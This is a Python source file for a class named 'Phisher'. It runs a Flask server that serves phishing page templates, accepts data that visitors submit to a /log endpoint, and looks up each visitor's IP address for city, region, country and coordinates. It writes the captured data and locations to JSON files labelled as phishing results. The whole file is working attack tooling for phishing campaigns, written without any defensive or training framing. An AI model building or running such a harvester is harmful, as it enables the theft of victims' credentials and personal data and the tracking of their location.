import os
import json
import requests
from datetime import datetime
from typing import Dict, Optional
import ipinfo
from flask import Flask, render_template, request, jsonify
import threading
import webbrowser

class Phisher:
    def __init__(self):
        self.app = Flask(__name__)
        self.templates_dir = "templates/phishing"
        self.results = []
        self.access_token = os.getenv('IPINFO_TOKEN')
        self.handler = ipinfo.getHandler(self.access_token)
        
        # Create templates directory if it doesn't exist
        os.makedirs(self.templates_dir, exist_ok=True)
        
        # Setup routes
        self._setup_routes()
    
    def _setup_routes(self):
        """Setup Flask routes for the phishing server"""
        @self.app.route('/')
        def index():
            return render_template('index.html')
        
        @self.app.route('/log', methods=['POST'])
        def log_data():
            data = request.json
            ip = request.remote_addr
            self._log_visit(ip, data)
            return jsonify({"status": "success"})
    
    def start(self, template: str):
        """Start phishing campaign with specified template"""
        try:
            # Load template
            template_path = os.path.join(self.templates_dir, f"{template}.html")
            if not os.path.exists(template_path):
                print(f"Template {template} not found")
                return
            
            # Start Flask server in a separate thread
            self.server_thread = threading.Thread(target=self._run_server)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            # Open browser to the phishing page
            webbrowser.open('http://localhost:5000')
            
            print(f"Phishing campaign started with template: {template}")
            
        except Exception as e:
            print(f"Error starting phishing campaign: {str(e)}")
    
    def _run_server(self):
        """Run the Flask server"""
        self.app.run(host='0.0.0.0', port=5000)
    
    def _log_visit(self, ip: str, data: Dict):
        """Log visitor information and data"""
        try:
            # Get IP information
            details = self.handler.getDetails(ip)
            
            visit_data = {
                'timestamp': datetime.now().isoformat(),
                'ip': ip,
                'location': {
                    'city': details.city,
                    'region': details.region,
                    'country': details.country,
                    'loc': details.loc
                },
                'data': data
            }
            
            self.results.append(visit_data)
            
            # Save to file
            self._save_results()
            
        except Exception as e:
            print(f"Error logging visit: {str(e)}")
    
    def _save_results(self):
        """Save phishing results to JSON file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"phishing_results_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=4)
        
        print(f"Phishing results saved to {filename}")
    
    def get_results(self) -> list:
        """Get list of all phishing results"""
        return self.results
    
    def stop(self):
        """Stop the phishing server"""
        try:
            # This is a simple implementation - in production, you'd want a more robust way to stop the server
            os._exit(0)
        except Exception as e:
            print(f"Error stopping server: {str(e)}") 